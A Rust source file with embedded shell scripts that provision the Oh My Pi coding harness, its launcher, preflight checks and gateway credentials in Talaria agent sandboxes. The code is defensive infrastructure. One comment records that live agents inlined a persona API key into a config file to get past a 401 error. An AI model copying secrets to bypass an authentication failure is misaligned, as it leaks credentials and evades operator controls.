        continue
      fi
      if [ "$waited" -ge __LOCKWAIT__ ]; then
        rm -rf "$mine"
        echo "another provision held the Oh My Pi install lock for __LOCKWAIT__ s; provisioning again takes it once that install is done" >&2
        fault host
      fi
      sleep 2
      waited=$((waited + 2))
    done
  fi
  if ! current_ok; then
    # Install beside whatever is there, prove it starts, then swap it in by
    # renaming a symlink over the old one: atomic, and a job already running
    # keeps the directory it started from. Nothing here deletes an install.
    new="$root/.__OMPV__.$(date +%s).$$"
    mkdir -p "$new"
    # omp itself is exact, and so are its own @oh-my-pi packages; the
    # verified pair's lockfile pins everything else, integrity included.
    # (Not a production-only install: this package.json has no
    # devDependencies, and that flag makes bun write no lockfile, the one
    # thing the smoke test keeps.)
    printf '{"name":"talaria-omp","private":true,"dependencies":{"__PKG__":"__OMPV__"}}\n' > "$new/package.json"
    # A mirror's URL reaches bun with a trailing slash: bun joins the package
    # name onto it, and without one drops the URL's last path segment.
    flags=""
    if [ "$frozen" = 1 ]; then
      cp "$lockin" "$new/bun.lock"
      flags="--frozen-lockfile"
    fi
    rc=0
    (cd "$new" && export BUN_INSTALL_CACHE_DIR="__HROOT__/bun-cache" && if [ -n "__REGISTRY__" ]; then export BUN_CONFIG_REGISTRY="__REGISTRY__/"; fi \
      && bounded __TINSTALL__ "$real" install --no-progress $flags >"$new/install.log" 2>&1 </dev/null 9>&-) || rc=$?
    if [ "$rc" != 0 ]; then
      tail -n 15 "$new/install.log" >&2
      rm -rf "$new"
      case "$rc" in
        124|137) echo "Oh My Pi __OMPV__ did not finish installing within __TINSTALL__ s" >&2; fault timeout ;;
      esac
      echo "could not install Oh My Pi __OMPV__ (bun install, above)" >&2
      fault install
    fi
    if [ -n "__INTEGRITY__" ] && ! grep -qF "__INTEGRITY__" "$new/bun.lock" 2>/dev/null; then
      rm -rf "$new"
      echo "Oh My Pi __OMPV__ installed a tarball whose integrity is not the one npm documents (__INTEGRITY__)" >&2
      fault start
    fi
    # What it printed when it would not start is the reason an admin reads
    # (omp's own `Bun runtime must be >= …` line), so it is kept.
    if ! start_check "$new/node_modules/__PKG__/dist/cli.js"; then
      rm -rf "$new"
      case "$rc" in
        124|137) echo "Oh My Pi __OMPV__ did not finish starting within __TSTART__ s on bun __BUN__" >&2 ;;
        *) echo "Oh My Pi __OMPV__ installed but does not start on bun __BUN__: $(printf '%s' "$said" | tail -n 3)" >&2 ;;
      esac
      fault start
    fi
    # An install from before installs were swapped is a real directory at the
    # link's path: move it aside (a rename, so a process in it keeps running)
    # and stamp it retired, which is when its prune clock starts.
    if [ -d "$link" ] && [ ! -L "$link" ]; then
      aside="$root/.__OMPV__.moved.$(date +%s).$$"
      mv "$link" "$aside"
      touch "$aside/.retired"
    fi
    # Only an install the link already names is swapped OUT: on a version's
    # first install there is none, and `readlink -f` of the missing link
    # would name the link itself, stamping the new install retired.
    old=""
    if [ -L "$link" ]; then old="$(readlink -f "$link" 2>/dev/null || true)"; fi
    ln -s "$new" "$link.tmp.$$"
    mv -T "$link.tmp.$$" "$link"
    # The install just swapped out is retired NOW, however old it is: a job
    # that started on it a minute ago may be running it for hours yet.
    if [ -n "$old" ] && [ -d "$old" ]; then
      touch "$old/.retired"
    fi
  fi
fi
# Prune: an install retired (swapped out, moved aside, or found not current)
# more than two days ago — its `.retired` stamp, never the install's own age,
# which says nothing about whether a job still runs it — that no running
# process maps (omp's native addon and chunks are mapped from its own dir),
# and that no job still holds: a job's launcher names the version link it was
# provisioned on (`omp/<v>/…`), and its teardown removes that launcher when
# the job ends, so a job that started on an older release keeps it however
# long it runs, while new jobs start on the newer one. The install this run
# answers for, and the channel's current and fallback installs (`keep`), are
# never pruned, and the one this run answers for loses any stamp an earlier
# run left on it: it is current again.
# One not current and not yet stamped is stamped now: its clock starts here.
# Then any version link left dangling.
cur="$(readlink -f "$link" 2>/dev/null || true)"
if [ -n "$cur" ] && [ -d "$cur" ]; then rm -f "$cur/.retired"; fi
keepdirs="|"
for k in __KEEP__; do
  kd="$(readlink -f "$root/$k" 2>/dev/null || true)"
  if [ -n "$kd" ] && [ -d "$kd" ]; then keepdirs="$keepdirs$kd|"; fi
done
for d in "$root"/.[0-9]*; do
  [ -d "$d" ] || continue
  dd="$(readlink -f "$d")"
  [ "$dd" = "$cur" ] && continue
  case "$keepdirs" in *"|$dd|"*) continue ;; esac
  if [ ! -e "$d/.retired" ]; then
    touch "$d/.retired"
    continue
  fi
  [ -n "$(find "$d/.retired" -maxdepth 0 -mmin -__RETIRE_MIN__ 2>/dev/null)" ] && continue
  grep -qsF "$d/" /proc/[0-9]*/maps 2>/dev/null && continue
  held=""
  for l in "$root"/*; do
    [ -L "$l" ] && [ "$(readlink -f "$l")" = "$d" ] || continue
    if grep -qsF "$l/" "__JOBS__"/*-*-*-*-*/omp 2>/dev/null; then held=1; break; fi
  done
  [ -n "$held" ] && continue
  rm -rf "$d"
done
for l in "$root"/*; do
  [ -L "$l" ] || continue
  [ -e "$l" ] || rm -f "$l"
done
if ! start_check "$entry"; then
  echo "Oh My Pi __OMPV__ does not start on bun __BUN__: $(printf '%s' "$said" | tail -n 3)" >&2
  fault start
fi
# A provision promotes the bun it just started on to the volume's shell
# `bun`; a smoke test never does (the candidate is not verified yet).
if [ "$smoke" != 1 ] && [ "$(readlink -f "$bin/bun" 2>/dev/null || true)" != "$real" ]; then
  if [ -x "$mise" ]; then bounded __TMISE__ "$mise" use -g bun@__BUN__ >/dev/null 2>&1 </dev/null 9>&- || true; fi
  ln -s "$real" "$bin/bun.tmp.$$" && mv -T "$bin/bun.tmp.$$" "$bin/bun"
fi
echo "bun $("$real" --version </dev/null 9>&-)"
echo "omp $said"
echo "bunPath $real"
"#;
    script
        .replace("__INSTALL_MISE__", &install_mise_sh(b.mise_secs))
        .replace("__XDG__", xdg)
        .replace("__BIN__", bin)
        .replace("__BUN__", &v.bun)
        .replace("__JOBS__", &format!("{harness_root}/jobs"))
        .replace("__OMPROOT__", &root)
        .replace("__OMPDIR__", &link)
        .replace("__ENTRY__", &entry)
        .replace("__SMOKE__", if run.smoke { "1" } else { "0" })
        .replace("__FROZEN__", if run.frozen { "1" } else { "0" })
        .replace("__KEEP__", &run.keep.join(" "))
        .replace("__INTEGRITY__", run.integrity.unwrap_or(""))
        .replace("__REGISTRY__", run.registry.unwrap_or(""))
        .replace("__TSTART__", &b.start_secs.to_string())
        .replace("__TINSTALL__", &b.install_secs.to_string())
        .replace("__TMISE__", &b.mise_secs.to_string())
        .replace("__LOCKWAIT__", &b.lock_wait_secs.to_string())
        .replace("__LOCKSTALE__", &PIDLESS_LOCK_STALE_SECS.to_string())
        .replace("__RETIRE_MIN__", &RETIRED_KEEP_MINS.to_string())
        .replace("__OMPV__", &v.omp)
        .replace("__PKG__", OMP_PACKAGE)
        .replace("__HROOT__", harness_root)
}

/// How long a provision waits for another one's omp install. Inside the
/// exec's own limit ([`RUNTIME_EXEC_SECS`]) with every bounded step after it,
/// so a waiter answers with a reason instead of being killed.
pub const INSTALL_LOCK_WAIT_SECS: u64 = 240;

/// A lock directory with no holder pid (left by an older script) is taken
/// over once it is this old.
pub const PIDLESS_LOCK_STALE_SECS: u64 = 120;

/// How long a retired omp install (swapped out, moved aside, or no longer
/// the pinned version) is kept before the prune may remove it, counted from
/// its `.retired` stamp: two days.
pub const RETIRED_KEEP_MINS: u64 = 2 * 24 * 60;

/// What [`harness_runtime_script`] reported.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Runtime {
    /// bun's own `--version`.
    pub bun: String,
    /// omp's own `--version` line (`omp/<v>`).
    pub omp: String,
    /// The real bun binary the launcher execs — never the PATH's `bun`.
    pub bun_path: String,
}

impl Runtime {
    /// The Oh My Pi release this runtime answered (`omp/<v>` → `<v>`).
    pub fn omp_version(&self) -> &str {
        self.omp.strip_prefix("omp/").unwrap_or(&self.omp)
    }

    /// The pair this runtime runs.
    pub fn versions(&self) -> Versions {
        Versions {
            bun: self.bun.clone(),
            omp: self.omp_version().to_string(),
        }
    }
}

/// Read the runtime script's three lines. `None` when any is missing: the
/// script printed something else, which the caller reports as it is.
pub fn parse_runtime(out: &str) -> Option<Runtime> {
    let field = |key: &str| {
        out.lines()
            .filter_map(|l| l.trim().strip_prefix(key))
            .next_back()
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
    };
    Some(Runtime {
        bun: field("bun ")?,
        omp: field("omp ")?,
        bun_path: field("bunPath ")?,
    })
}

/// Lay out a job's harness directory, as the agent's user. `$1` is
/// [`job_harness_dir`], `$2` the job's omp session dir (made here so the
/// first run finds it), `$3` a path that must still exist (the job's
/// `.git`; doctor's slot passes the workbench root); the launcher's text
/// arrives on stdin ([`launcher_script`]).
///
/// The agent dir LINKS the rendered files rather than copying them: the
/// render rewrites `/opt/workbench-config` in place, so a changed role model
/// or key name reaches the next run of every job, and nothing here ever holds
/// a key. (Live, the agents' own copies inlined the persona key into
/// `models.yml` to get past a 401.)
pub const JOB_HARNESS_SH: &str = r#"set -eu
dir="$1"; sessions="$2"; must="$3"; agent="$dir/agent"; cfg="__CFG__"
# A job torn down while it was provisioning has no checkout any more: lay
# nothing out for it, or this would re-create a dir the teardown removed.
if [ ! -e "$must" ]; then
  echo "the job's checkout ($must) is gone — the job ended while it was provisioning" >&2
  exit 3
fi
mkdir -p "$agent" "$sessions"
ln -sfn "$cfg/models.yml" "$agent/models.yml"
ln -sfn "$cfg/mcp.json" "$agent/mcp.json"
ln -sfn "$cfg/pi-settings.json" "$agent/settings.json"
if [ -d /opt/skills ]; then ln -sfn /opt/skills "$agent/skills"; fi
tmp="$dir/omp.tmp.$$"
cat > "$tmp"
chmod 0755 "$tmp"
mv -f "$tmp" "$dir/omp"
echo "ready $dir/omp"
"#;

/// [`JOB_HARNESS_SH`] with its one constant filled.
pub fn job_harness_script() -> String {
    JOB_HARNESS_SH.replace("__CFG__", WORKBENCH_CONFIG_DIR)
}

/// The exit status the launcher uses for "this sandbox cannot run the
/// harness" (sysexits' EX_CONFIG), so a caller can tell it from omp's own.
pub const LAUNCHER_REFUSED: i32 = 78;

/// A job's launcher: the whole harness, as one command.
///
/// `name` is the job's slot ([`job_harness_dir`]), `workdir` its checkout,
/// `rt` the runtime provisioned for it (its real bun, by path, and the omp
/// release it answered — the launcher names exactly that install, so a newer
/// release adopted later never moves a job already running), and `gateway`
/// whether the job's harness authenticates to the Talaria gateway (a coding
/// account's does not, so it needs no workbench key).
///
/// It owns everything the agents used to reassemble by hand in their own
/// wrappers: the job's own agent dir, the repo's toolchain on PATH (mise's
/// shims, absolute, whatever shell starts it), the project env, the workdir,
/// and omp run on the harness's bun. It refuses — exit
/// [`LAUNCHER_REFUSED`], one sentence — when the gateway key is absent from
/// the shell, rather than letting omp start and answer `401` or a missing
/// model after the agent has already spent a turn on it.
pub fn launcher_script(name: &str, workdir: &str, rt: &Runtime, gateway: bool) -> Option<String> {
    let v = rt.versions();
    if !plain_version(&v.omp) {
        return None;
    }
    launcher_script_with(name, workdir, &rt.bun_path, gateway, &omp_entry(&v.omp), &v)
}

/// [`launcher_script`] for another omp entry — the launcher the tests run.
fn launcher_script_with(
    name: &str,
    workdir: &str,
    bun_path: &str,
    gateway: bool,
    entry: &str,
    v: &Versions,
) -> Option<String> {
    let agent = job_agent_dir(name)?;
    let key_check = if gateway {
        format!(
            "if [ -z \"${{{key}:-}}\" ]; then\n  echo \"talaria: {key} is not set in this shell, so Oh My Pi has no key for the Talaria gateway. The agent's sandbox predates the workbench key and must be rolled; this is not something to work around — report_problem.\" >&2\n  exit {code}\nfi\n",
            key = WORKBENCH_KEY_ENV,
            code = LAUNCHER_REFUSED
        )
    } else {
        String::new()
    };
    Some(format!(
        "#!/bin/sh\n\
         # Oh My Pi {omp} on bun {bunv} for workbench job {name}.\n\
         # Written by Talaria's provisioning and rewritten on every provision: do not edit it,\n\
         # copy it, or wrap it. Its arguments go to omp as given.\n\
         export PI_CODING_AGENT_DIR={agent}\n\
         export MISE_DATA_DIR=\"${{MISE_DATA_DIR:-${{XDG_DATA_HOME:-{xdg}}}/mise}}\"\n\
         export MISE_YES=1 MISE_TRUSTED_CONFIG_PATHS=/opt/data/workbench/jobs\n\
         PATH=\"$MISE_DATA_DIR/shims:$PATH\"\n\
         export PATH\n\
         {key_check}\
         cd {workdir} || {{ echo \"talaria: this job's checkout ({workdir}) is not there — call prepare_env, which provisions this job again\" >&2; exit {code}; }}\n\
         if [ -f .talaria/env ]; then set -a; . ./.talaria/env; set +a; fi\n\
         [ -f {entry} ] || {{ echo \"talaria: Oh My Pi {omp} is not installed here any more — call prepare_env, which provisions this job again\" >&2; exit {code}; }}\n\
         exec {bun} {entry} \"$@\"\n",
        agent = sh_quote(&agent),
        workdir = sh_quote(workdir),
        bun = sh_quote(bun_path),
        entry = sh_quote(entry),
        code = LAUNCHER_REFUSED,
        xdg = HARNESS_XDG_DATA_HOME,
        omp = v.omp,
        bunv = v.bun,
    ))
}

/// The cheap preflight, run in the shell the AGENT'S terminal gives a
/// command (the caller wraps it: Hermes's stripped names unset, its HOME,
/// a login shell). Positional args: `$1` launcher, `$2` agent dir, `$3`
/// model id ("" when the job is not on the gateway), then Hermes's stripped
/// names to unset. It prints `OK <omp version>` or `FAIL <check>` followed
/// by what the check saw — never a key.
///
/// No model call: every failure the live fleet hit is visible without one.
/// omp not starting (bun too old, a missing install) is `--version`; the
/// SQLITE_CANTOPEN on a root-owned agent dir is the write probe; `Model …
/// not found` is the model id missing from the catalog omp reads; a `401`
/// is the gateway's own model list refusing the key, which costs nothing.
pub const PREFLIGHT_SH: &str = r#"L="$1"; A="$2"; M="$3"; shift 3
for n do unset "$n" 2>/dev/null || true; done
for n in ${!CONFIG_@}; do unset "$n" 2>/dev/null || true; done
fail() { printf 'FAIL %s\n%s\n' "$1" "$2"; exit 0; }
[ -x "$L" ] || fail launcher "the launcher $L is missing or not executable"
if [ -n "$M" ] && [ -z "${__KEY__:-}" ]; then
  fail key "__KEY__ is not set in the agent's terminal, so omp has no key for the Talaria gateway (the sandbox predates the workbench key: roll the agent)"
fi
v=$("$L" --version 2>&1 </dev/null); rc=$?
case "$v" in
  *"omp/__OMPV__"*) ;;
  *) fail version "the launcher exited $rc: $(printf '%s' "$v" | tail -n 5)" ;;
esac
t="$A/.talaria-write-probe"
if ! { touch "$t" 2>/dev/null && rm -f "$t"; }; then
  fail writable "$(id -un) cannot write omp's agent dir $A ($(stat -c %U:%a "$A" 2>/dev/null))"
fi
if [ -n "$M" ]; then
  [ -r "$A/models.yml" ] || fail models "omp has no model catalog at $A/models.yml (-> $(readlink "$A/models.yml" 2>/dev/null))"
  sed -n 's/^[[:space:]]*-\{0,1\}[[:space:]]*id:[[:space:]]*//p' "$A/models.yml" | tr -d "\"'" | grep -qxF -- "$M" \
    || fail models "the model catalog omp reads does not list $M, so omp would answer: Model \"talaria/$M\" not found"
  base=$(sed -n 's/^[[:space:]]*baseUrl:[[:space:]]*//p' "$A/models.yml" | head -n 1 | tr -d "\"'")
  [ -n "$base" ] || fail models "the model catalog at $A/models.yml names no baseUrl"
  code=$("__BUN__" -e 'try { const r = await fetch(process.argv[1] + "/models", { headers: { authorization: "Bearer " + (process.env.__KEY__ || "") }, signal: AbortSignal.timeout(20000) }); console.log(r.status) } catch (e) { console.log("unreachable: " + (e && e.message || e)) }' "$base" 2>&1 | tail -n 1)
  [ "$code" = 200 ] || fail gateway "the Talaria gateway's model list at $base/models answered $code to the workbench key"
fi
echo "OK $v"
"#;

/// [`PREFLIGHT_SH`] with its constants filled; `bun_path` runs the gateway
/// check (curl is not promised by every image, bun is: it was just
/// provisioned), and `omp_version` is the release the launcher must answer
/// (the one just provisioned).
pub fn preflight_script(bun_path: &str, omp_version: &str) -> String {
    PREFLIGHT_SH
        .replace("__KEY__", WORKBENCH_KEY_ENV)
        .replace("__OMPV__", omp_version)
        .replace("__BUN__", bun_path)
}

/// What the preflight said: `Ok(version)`, or the failed check and what it
/// saw.
pub fn preflight_verdict(out: &str) -> Result<String, (String, String)> {
    let mut lines = out.lines();
    while let Some(line) = lines.next() {
        let line = line.trim();
        if let Some(v) = line.strip_prefix("OK ") {
            return Ok(v.trim().to_string());
        }
        if let Some(check) = line.strip_prefix("FAIL ") {
            let detail: Vec<&str> = lines.collect();
            return Err((
                check.trim().to_string(),
                detail.join("\n").trim().to_string(),
            ));
        }
    }
    Err((
        "preflight".into(),
        if out.trim().is_empty() {
            "the preflight printed nothing".into()
        } else {
            out.trim().to_string()
        },
    ))
}

/// The MCP pass-through file omp reads inside [`PI_CODING_AGENT_DIR`].
pub const MCP_CONFIG_FILE: &str = "mcp.json";

/// The model catalog omp reads inside [`PI_CODING_AGENT_DIR`]: `models.yml`,
/// not `models.json`. omp converts a `models.json` into `models.yml` ONCE —
/// only while no `models.yml` exists — and reads the YAML from then on, so a
/// rendered `models.json` reached an agent's omp on its first run and never
/// again: a changed role model or key name stayed whatever the first run saw.
pub const MODELS_CONFIG_FILE: &str = "models.yml";

/// The env var the workbench credential reaches the sandbox under, and the
/// name models.yml's `apiKey` gives omp to read it from.
///
/// NOT `OPENAI_API_KEY`. Hermes strips its provider names — `OPENAI_API_KEY`,
/// `OPENAI_BASE_URL`, `ANTHROPIC_*` and the rest — from the env of every
/// command its terminal runs, and `terminal.env_passthrough` refuses to put
/// them back (Hermes `tools/environments/local_env_policy.py`,
/// `tools/env_passthrough.py`). The key used to ride `OPENAI_API_KEY`, so omp
/// started from the agent's terminal — the only way an agent starts it — had
/// no key: present for `docker exec`, gone for the agent. A `TALARIA_` name is
/// not Hermes's, so it survives the scrub; `talaria-agent-secrets` keeps a
/// per-agent secret from taking it.
///
/// And a BARE name: omp resolves an `apiKey` by looking up an env var with
/// exactly that name, and sends the value as written when there is none —
/// `"$OPENAI_API_KEY"` named no variable, so it went out as the literal text
/// `$OPENAI_API_KEY`.
pub const WORKBENCH_KEY_ENV: &str = "TALARIA_WORKBENCH_API_KEY";

// The harness reaches the same org gateway the personas do, but on its OWN
// credential (`workbench-gateway`, minted into the fleet .env as
// LLM_WORKBENCH_API_KEY by fleet-brain, handed to the sandbox as
// [`WORKBENCH_KEY_ENV`]). It must: a harness run is spend NO
// Talaria flow ever sees — no chat/channel/ticket row is written for it — so
// the gateway is the only place it can enter the ledger, while the personas'
// key had to stay unmetered there while a chat flow wrote each persona turn's
// row. One shared credential could only be one of those two things, so harness
// runs were either invisible or doubled every persona turn. (Each agent now
// has its own key, metered call by call at the relay; the workbench key still
// keeps a harness run's spend apart from the agent's own.)
//
// NO FALLBACK TO THE PERSONAS' KEY. This used to read
// `${LLM_WORKBENCH_API_KEY:-${LLM_API_KEY}}` so an operator-overridden fleet
// (LLM_BASE_URL at a raw upstream, no gateway brain provisioned) kept working
// on the key it configured. The cost was that every Developer Agent sandbox —
// a container that runs model-authored code from untrusted repos — could read
// the fleet-wide, unmetered persona key out of its own environment. The
// sandbox gets the workbench key and nothing else; an operator on a raw
// upstream sets LLM_WORKBENCH_API_KEY explicitly.
//
// No base URL rides the env: models.yml carries the gateway's URL as a
// literal (`OPENAI_BASE_URL` was never read by omp, and Hermes strips it).
pub fn gateway_env() -> Map<String, Value> {
    let mut env = Map::new();
    env.insert(
        WORKBENCH_KEY_ENV.into(),
        Value::String("${LLM_WORKBENCH_API_KEY}".into()),
    );
    env
}

/// The container env omp needs: gateway auth plus its config dir.
pub fn omp_env() -> Map<String, Value> {
    let mut env = gateway_env();
    env.insert("PI_CODING_AGENT_DIR".into(), json!(PI_CODING_AGENT_DIR));
    env
}

/// A model id as omp's CLI and role env expect it.
pub fn model_arg(model: &str) -> String {
    format!("{PROVIDER}/{model}")
}

/// Slot the job's launcher, model and session dir into an invoke template.
/// `<task>` stays for the driving agent to fill — that is the steer, not a
/// platform value.
pub fn fill_cmd(tmpl: &str, model: Option<&str>, session_dir: &str, launcher: &str) -> String {
    fill_cmd_arg(tmpl, model.map(model_arg).as_deref(), session_dir, launcher)
}

/// `fill_cmd` for a model argument that is ALREADY provider-qualified.
///
/// A coding account's models are its own provider's (`anthropic/…`), not the
/// gateway's, so they must not take the `talaria/` prefix. Both paths go
/// through one template filler so an invocation line can never end up with
/// two prefixes or none.
pub fn fill_cmd_arg(
    tmpl: &str,
    model_arg: Option<&str>,
    session_dir: &str,
    launcher: &str,
) -> String {
    let mut s = tmpl
        .replace("<launcher>", &sh_quote(launcher))
        .replace("<sessionDir>", &sh_quote(session_dir));
    if let Some(arg) = model_arg {
        s = s.replace("<model>", &sh_quote(arg));
    }
    s
}

/// A value as ONE shell word, whatever it holds.
///
/// Everything slotted into an invocation line is handed to the driving agent
/// as "the command to run as written", so a value carrying a shell
/// metacharacter would run as a command inside the sandbox. The routes that
/// accept a model id already refuse anything outside the model-id grammar;
/// this is the second fence, so the line is safe even for a value that got
/// in some other way. A value made only of characters a POSIX shell never
/// interprets passes through bare — the usual line stays readable — and
/// anything else is single-quoted with the one escape single quotes need.
pub fn sh_quote(s: &str) -> String {
    let bare = !s.is_empty()
        && s.bytes().all(|b| {
            b.is_ascii_alphanumeric()
                || matches!(
                    b,
                    b'.' | b'_' | b':' | b'/' | b'-' | b'@' | b'%' | b'+' | b'=' | b','
                )
        });
    if bare {
        return s.to_string();
    }
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Inline `KEY=value ` assignments to prefix an invocation line with, for the
/// roles that ride env rather than `--model`.
///
/// WHY INLINE AND NOT ONLY THE CONTAINER ENV. The container's role env is
/// rendered per agent, so it can only ever carry the agent's DEFAULT plan —
/// a ticket pinned to another plan cannot re-render a running container, and
/// an account signed in since the last roll would otherwise be invisible to
/// the harness until someone rolled the agent. Putting the resolved roles on
/// the line itself makes each job self-describing and correct whatever the
/// container was last rendered with.
pub fn role_env_prefix(roles: &[(String, String)]) -> String {
    let mut out = String::new();
    for (role, arg) in roles {
        let var = match role.as_str() {
            "smol" => "PI_SMOL_MODEL",
            "slow" => "PI_SLOW_MODEL",
            "plan" => "PI_PLAN_MODEL",
            // `default` rides `--model`; anything else is not a role omp reads.
            _ => continue,
        };
        out.push_str(var);
        out.push('=');
        out.push_str(&sh_quote(arg));
        out.push(' ');
    }
    out
}

// ── Model roles (the org's Workbench roles, handed to omp) ──────────────────

/// omp's model roles, resolved from the org's Workbench roles. `None` means
/// nothing in the chain resolves, so omp runs on its default alone.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct OmpRoles {
    pub default: Option<String>,
    pub smol: Option<String>,
    pub slow: Option<String>,
    pub plan: Option<String>,
}

impl OmpRoles {
    /// The map agents see (doctor, list_repos, start_job). Fixed key order.
    pub fn wire(&self) -> Value {
        json!({
            "default": self.default,
            "smol": self.smol,
            "slow": self.slow,
            "plan": self.plan,
        })
    }

    /// omp reads its non-default roles from these env vars; the default rides
    /// `--model` on the invocation line. Unresolved roles are left unset so
    /// omp falls back to its default rather than a model that does not exist.
    pub fn env(&self) -> Map<String, Value> {
        let mut env = Map::new();
        for (key, model) in [
            ("PI_SMOL_MODEL", &self.smol),
            ("PI_SLOW_MODEL", &self.slow),
            ("PI_PLAN_MODEL", &self.plan),
        ] {
            if let Some(m) = model {
                env.insert(key.into(), json!(model_arg(m)));
            }
        }
        env
    }

    /// Every distinct model, default first: what models.yml declares.
    pub fn model_ids(&self) -> Vec<String> {
        let mut ids: Vec<String> = Vec::new();
        for m in [&self.default, &self.smol, &self.slow, &self.plan]
            .into_iter()
            .flatten()
        {
            if !ids.contains(m) {
                ids.push(m.clone());
            }
        }
        ids
    }
}

/// The org's code-standard / code-light / code-heavy roles as omp's default /
/// smol / slow+plan. Each resolves with a fall-down chain so unset slots never
/// strand work. A DB failure inside the chain propagates; the caller surfaces
/// it as a thrown tool error, not a resolved null.
pub async fn omp_roles(pg: &PgPool) -> Result<OmpRoles, String> {
    let default = role_model(pg, "standard").await?;
    let smol = role_model(pg, "light").await?;
    let heavy = role_model(pg, "heavy").await?;
    Ok(OmpRoles {
        default,
        smol,
        slow: heavy.clone(),
        plan: heavy,
    })
}

async fn role_model(pg: &PgPool, weight: &str) -> Result<Option<String>, String> {
    async fn resolves(pg: &PgPool, model: &str) -> Result<bool, String> {
        Ok(talaria_gateway::registry::resolve_route(pg, model)
            .await
            .map_err(|e| format!("route resolve: {e}"))?
            .is_some())
    }
    let order: &[&str] = match weight {
        "heavy" => &["heavy", "standard", "light"],
        "standard" => &["standard", "light"],
        _ => &["light"],
    };
    for w in order {
        if let Some(m) = talaria_model_roles::resolve_role_model(pg, &format!("code-{w}"))
            .await
            .map_err(|err| format!("role resolve: {err}"))?
        {
            return Ok(Some(m));
        }
    }
    if let Some(utility) = talaria_model_roles::resolve_role_model(pg, "utility")
        .await
        .map_err(|err| format!("role resolve: {err}"))?
    {
        return Ok(Some(utility));
    }
    let env_model = std::env::var("TALARIA_COPILOT_MODEL").ok();
    for m in [env_model, Some("pl-main".to_string())] {
        let Some(m) = m else { continue };
        if resolves(pg, &m).await? {
            return Ok(Some(m));
        }
    }
    Ok(None)
}

// ── Is the sandbox the one the current render builds? ───────────────────────

/// The shape of the rendered sandbox, as a token the container carries.
///
/// A render change only reaches a container when the agent is re-rendered
/// and ROLLED, and nothing forced that or noticed it had not happened. The
/// cont-init hook that hands the harness directories to the runtime user sat
/// in the render, with a test, while the live fleet ran containers whose
/// `/etc/cont-init.d` had never contained it — so a fix that was correct,
/// reviewed and merged was absent from every agent, and the only symptom was
/// a harness that would not start.
///
/// The render stamps this token into the container's own ENV
/// ([`SANDBOX_SHAPE_ENV`]); the workbench compares what the container carries
/// against what this build expects and says "roll the agent" when they
/// differ. **Bump it whenever the rendered sandbox shape changes** — a new
/// mount, a changed hook, a new env var. Getting a stale answer is the
/// failure this exists to make loud, so a forgotten bump is the one way it
/// can still be quiet; provisioning's preflight is the backstop for that.
///
/// WHY THE ENV AND NOT A FILE. It used to be a file in
/// `/opt/workbench-config`, which is a DIRECTORY bind of the render dir: the
/// render rewrote the token in place and every container — however old —
/// read the new one. The live engineering agent ran a container created
/// 2026-09-22 (root-owned harness dir, no workbench key in its env, the
/// pre-models.yml mounts) while its doctor called it current. A container's
/// env is fixed when it is created, which is exactly the property a
/// staleness token needs.
pub const SANDBOX_SHAPE: &str = "2026-11-04.shape-env+job-harness";

/// The container env var the render stamps [`SANDBOX_SHAPE`] into.
pub const SANDBOX_SHAPE_ENV: &str = "TALARIA_SANDBOX_SHAPE";

/// Where the render also leaves it, read-only, inside the container. Kept for
/// the record only: it lives in a live bind, so it is never evidence of what
/// built a container ([`SANDBOX_SHAPE`]).
pub const SANDBOX_SHAPE_FILE: &str = "/opt/workbench-config/render-shape";

/// The env a Developer Agent's container carries so the workbench can tell
/// which render created it.
pub fn shape_env() -> Map<String, Value> {
    let mut env = Map::new();
    env.insert(SANDBOX_SHAPE_ENV.into(), json!(SANDBOX_SHAPE));
    env
}

/// Is a container that carries `found` (its [`SANDBOX_SHAPE_ENV`], empty when
/// unset) the one this build renders? `None` when it is; the reason when not.
pub fn sandbox_stale_reason(found: &str) -> Option<String> {
    let found = found.trim();
    if found == SANDBOX_SHAPE {
        return None;
    }
    Some(format!(
        "this sandbox was created by an older render ({}) and this Talaria renders {SANDBOX_SHAPE}: it is missing mounts and env the current harness needs, and only rolling the agent (Agents → the agent → Roll) recreates it",
        if found.is_empty() {
            "it predates the shape token"
        } else {
            found
        },
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    const JOB: &str = "11111111-2222-4333-8444-555555555555";

    /// Put a stand-in bun where mise installs `version`: the runtime script
    /// runs bun by that path.
    #[cfg(unix)]
    fn place_bun(xdg: &std::path::Path, version: &str, bun: &std::path::Path) {
        let dir = xdg.join(format!("mise/installs/bun/{version}/bin"));
        std::fs::create_dir_all(&dir).unwrap();
        let _ = std::fs::remove_file(dir.join("bun"));
        std::os::unix::fs::symlink(bun, dir.join("bun")).unwrap();
    }

    /// A runtime as the runtime script answers it, on the bootstrap pair.
    fn rt(bun_path: &str) -> Runtime {
        Runtime {
            bun: HARNESS_BUN.into(),
            omp: format!("omp/{OMP_VERSION}"),
            bun_path: bun_path.into(),
        }
    }

    // The pinned omp release's `engines.bun`, read off npm FOR THAT RELEASE
    // (`npm view @oh-my-pi/pi-coding-agent@<v> engines`). Tied to the version
    // it was read for: bumping OMP_VERSION fails here until the floor is
    // re-read, so a release whose floor outruns HARNESS_BUN cannot ship.
    const OMP_BUN_FLOOR: (&str, [u32; 3]) = ("18.16.0", [1, 4, 4]);

    #[test]
    fn the_bootstraps_declared_range_is_its_floor() {
        let f = OMP_BUN_FLOOR.1;
        assert_eq!(
            OMP_VERSION_BUN_RANGE,
            format!(">={}.{}.{}", f[0], f[1], f[2]),
            "OMP_VERSION_BUN_RANGE is the bootstrap's engines.bun"
        );
    }

    #[test]
    fn the_pinned_bun_is_one_the_pinned_omp_will_start_on() {
        assert_eq!(
            OMP_VERSION, OMP_BUN_FLOOR.0,
            "OMP_VERSION moved: re-read its engines.bun from npm and update OMP_BUN_FLOOR"
        );
        let pin: Vec<u32> = HARNESS_BUN
            .split('.')
            .map(|part| part.parse().expect("HARNESS_BUN is a plain x.y.z"))
            .collect();
        assert!(
            pin.as_slice() >= OMP_BUN_FLOOR.1.as_slice(),
            "omp {OMP_VERSION} exits with `Bun runtime must be >= {:?}` on bun {HARNESS_BUN}",
            OMP_BUN_FLOOR.1
        );
    }

    #[test]
    fn the_runtime_script_puts_the_pinned_bun_on_every_shells_path() {
        let s = harness_runtime_script(&RuntimeRun::provision(&Versions::bootstrap())).unwrap();
        assert!(!s.contains("__"), "every placeholder is filled: {s}");
        assert!(s.contains(&format!("bun@{HARNESS_BUN}")));
